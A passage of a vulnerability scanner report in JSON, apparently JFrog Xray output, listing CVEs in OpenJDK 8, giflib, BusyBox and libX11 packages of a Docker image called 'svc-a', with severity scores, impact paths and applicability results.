                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-21011",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-612404",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u411, 8u411-perf, 11.0.23, 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM for JDK: 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM Enterprise Edition: 20.3.14 and  21.3.10. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 4.8 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u411, 8u411-perf, 11.0.23, 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM for JDK: 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM Enterprise Edition: 20.3.14 and  21.3.10. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized update, insert or delete access to some of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized read access to a subset of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 4.8 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N).",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-21140"
                        }
                    ],
                    "created": "2024-07-18T00:00:00.278Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-21140",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-529054",
                    "summary": "giflib v5.2.1 was discovered to contain a segmentation fault via the component getarg.c.",
                    "description": "giflib v5.2.1 was discovered to contain a segmentation fault via the component getarg.c.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-39742",
                            "cwe": [
                                "CWE-120"
                            ],
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2023-08-27T00:00:00.672Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:giflib:5.1.9-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-39742",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-195103",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 11.0.13, 17.0.1; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21283",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2022-01-20T00:00:00.351Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21283",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-612403",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u411, 8u411-perf, 11.0.23, 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM for JDK: 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM Enterprise Edition: 20.3.14 and  21.3.10. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Hotspot).  Supported versions that are affected are Oracle Java SE: 8u411, 8u411-perf, 11.0.23, 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM for JDK: 17.0.11, 21.0.3, 22.0.1; Oracle GraalVM Enterprise Edition: 20.3.14 and  21.3.10. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 3.7 (Availability impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Unknown",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2024-21138",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ]
                        }
                    ],
                    "created": "2024-07-18T00:00:00.278Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2024-21138",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-190218",
                    "summary": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the nvalloc function",
                    "description": "A use-after-free in Busybox's awk applet leads to denial of service and possibly code execution when processing a crafted awk pattern in the nvalloc function",
                    "issue_type": "security",
                    "severity": "High",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-42386",
                            "cwe": [
                                "CWE-416"
                            ],
                            "cvss_v2": "6.5/CVSS:2.0/AV:N/AC:L/Au:S/C:P/I:P/A:P",
                            "cvss_v3": "7.2/CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H"
                        }
                    ],
                    "created": "2021-11-18T00:00:00.937Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:ssl_client:1.30.1-r5",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__26d14edc4f17638cda363ea80b29c55e83058fc0dff1129b38ea3e8231217f7d.tar.gz/3.10:busybox:1.30.1-r5"
                    ],
                    "extended_information": {
                        "short_description": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
                        "full_description": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `nvalloc` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
                        "jfrog_research_severity": "Medium",
                        "jfrog_research_severity_reasons": [
                            {
                                "name": "The issue cannot result in a severe impact (such as remote code execution)",
                                "description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                                "is_positive": true
                            },
                            {
                                "name": "The prerequisites for exploiting the issue are extremely unlikely",
                                "description": "The applet must accept arbitrary command line arguments from an external source",
                                "is_positive": true
                            },
                            {
                                "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                                "description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                                "is_positive": true
                            }
                        ],
                        "remediation": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile"
                    },
                    "applicability": [
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "cve_id": "CVE-2021-42386",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Evidence",
                                        "Line Number",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "2988",
                                            "Busybox executable with awk applet was found"
                                        ],
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "4192",
                                            "Busybox executable with awk applet was found"
                                        ]
                                    ]
                                }
                            ],
                            "info": "Vulnerable usage of awk was {not }found",
                            "details": [
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 2988, Issue Found: Busybox executable with awk applet was found"
                                },
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 4192, Issue Found: Busybox executable with awk applet was found"
                                }
                            ]
                        },
                        {
                            "scanner_available": true,
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "cve_id": "CVE-2021-42386",
                            "scan_status": 1,
                            "applicability": false,
                            "evidence": [
                                {
                                    "column_names": [
                                        "Path",
                                        "Evidence",
                                        "Line Number",
                                        "Issue Found"
                                    ],
                                    "rows": [
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "2988",
                                            "Busybox executable with awk applet was found"
                                        ],
                                        [
                                            "/bin/busybox",
                                            "awk",
                                            "4192",
                                            "Busybox executable with awk applet was found"
                                        ]
                                    ]
                                }
                            ],
                            "info": "Vulnerable usage of awk was {not }found",
                            "details": [
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 2988, Issue Found: Busybox executable with awk applet was found"
                                },
                                {
                                    "file_path": "/bin/busybox",
                                    "details": "Evidence: awk, Line Number: 4192, Issue Found: Busybox executable with awk applet was found"
                                }
                            ]
                        }
                    ],
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:busybox:1.30.1-r5",
                            "vulnerability_id": "CVE-2021-42386",
                            "result": "not_applicable"
                        },
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "alpine://3.10:ssl_client:1.30.1-r5",
                            "vulnerability_id": "CVE-2021-42386",
                            "result": "not_applicable"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-195095",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: 2D). Supported versions that are affected are Oracle Java SE: 7u321, 8u311; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: 2D). Supported versions that are affected are Oracle Java SE: 7u321, 8u311; Oracle GraalVM Enterprise Edition: 20.3.4 and 21.3.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21349",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "5.0/CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "5.3/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2022-01-20T00:00:00.508Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21349",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-208677",
                    "summary": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u331, 8u321, 11.0.14, 17.0.2, 18; Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1 and 22.0.0.2. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: Libraries). Supported versions that are affected are Oracle Java SE: 7u331, 8u321, 11.0.14, 17.0.2, 18; Oracle GraalVM Enterprise Edition: 20.3.5, 21.3.1 and 22.0.0.2. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Oracle Java SE, Oracle GraalVM Enterprise Edition. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 3.7 (Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L).",
                    "issue_type": "security",
                    "severity": "Low",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2022-21443",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "4.3/CVSS:2.0/AV:N/AC:M/Au:N/C:N/I:N/A:P",
                            "cvss_v3": "3.7/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:L"
                        }
                    ],
                    "created": "2022-04-20T00:00:00.366Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-base:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre:8.275.01-r0",
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:openjdk8-jre-lib:8.275.01-r0"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2022-21443",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-533249",
                    "summary": "A vulnerability was found in libX11 due to an infinite loop within the PutSubImage() function. This flaw allows a local user to consume all available system resources and cause a denial of service condition.",
                    "description": "A vulnerability was found in libX11 due to an infinite loop within the PutSubImage() function. This flaw allows a local user to consume all available system resources and cause a denial of service condition.",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2023-43786",
                            "cwe": [
                                "CWE-835"
                            ],
                            "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                        }
                    ],
                    "created": "2023-10-10T00:00:00.931Z",
                    "impact_path": [
                        "default/dd-docker-local/svc-a/sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4/sha256__e30233369a5faae8d385d2e167cb9f237762d9187398c0a2537471e12cc4d5c3.tar.gz/3.10:libx11:1.6.12-r1"
                    ],
                    "applicability": null,
                    "applicability_details": [
                        {
                            "component_id": "docker://svc-a:sha256:a8d5ce7d9b1fdcd58b821930601a1a918b438a2e38498c148a556ac1be12b9b4",
                            "source_comp_id": "",
                            "vulnerability_id": "CVE-2023-43786",
                            "result": "not_covered"
                        }
                    ]
                },
                {
                    "issue_id": "XRAY-187949",
                    "summary": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via TLS to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.9 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N).",
                    "description": "Vulnerability in the Java SE, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE). Supported versions that are affected are Java SE: 7u311, 8u301, 11.0.12; Oracle GraalVM Enterprise Edition: 20.3.3 and 21.2.0. Difficult to exploit vulnerability allows unauthenticated attacker with network access via TLS to compromise Java SE, Oracle GraalVM Enterprise Edition. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability can also be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. CVSS 3.1 Base Score 5.9 (Confidentiality impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N).",
                    "issue_type": "security",
                    "severity": "Medium",
                    "provider": "JFrog",
                    "cves": [
                        {
                            "cve": "CVE-2021-35550",
                            "cwe": [
                                "NVD-CWE-noinfo"
                            ],
                            "cvss_v2": "7.1/CVSS:2.0/AV:N/AC:M/Au:N/C:C/I:N/A:N",
                            "cvss_v3": "5.9/CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N"
                        }
                    ],
                    "created": "2021-10-21T00:00:00.041Z",
                    "impact_path": [
